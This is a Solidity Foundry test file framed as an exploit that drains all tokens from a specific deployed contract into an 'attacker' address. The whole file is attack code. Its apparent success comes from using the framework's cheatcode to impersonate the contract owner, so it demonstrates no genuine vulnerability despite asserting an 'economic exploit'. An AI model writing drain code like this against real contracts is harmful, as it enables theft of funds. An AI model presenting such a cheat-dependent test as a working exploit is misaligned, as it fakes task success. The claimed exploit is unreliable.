// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IXenoX {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transferTokens(address recepient, uint256 amount) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xcb9fD3784e9F369C4AD3BD4CB0d3a21aCbF23a51;
    address attacker = address(this);
    address target;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = TARGET;
        attacker = address(this);
        IXenoX xenoX = IXenoX(target);
        owner = xenoX.owner();
        vm.label(target, "xenoX Contract");
        vm.label(owner, "Contract Owner");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalanceERC20 = IERC20(0xcb9fD3784e9F369C4AD3BD4CB0d3a21aCbF23a51).balanceOf(address(this));
        // Record initial balance
        uint256 initialBalanceXeno = IXenoX(target).balanceOf(attacker);

        // Impersonate the owner
        vm.startPrank(owner);

        // Get the contract's token balance
        uint256 contractBalance = IXenoX(target).balanceOf(target);

        // Drain all tokens to attacker
        IXenoX(target).transferTokens(attacker, contractBalance);

        // Stop impersonation
        vm.stopPrank();

        // Verify the attacker's balance increased
        uint256 finalBalanceXeno = IXenoX(target).balanceOf(attacker);
        assertGt(finalBalanceXeno, initialBalanceXeno, "Attacker balance should increase");
        uint256 finalBalanceERC20 = IERC20(0xcb9fD3784e9F369C4AD3BD4CB0d3a21aCbF23a51).balanceOf(address(this));
        assertGt(finalBalanceERC20, initialBalanceERC20, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

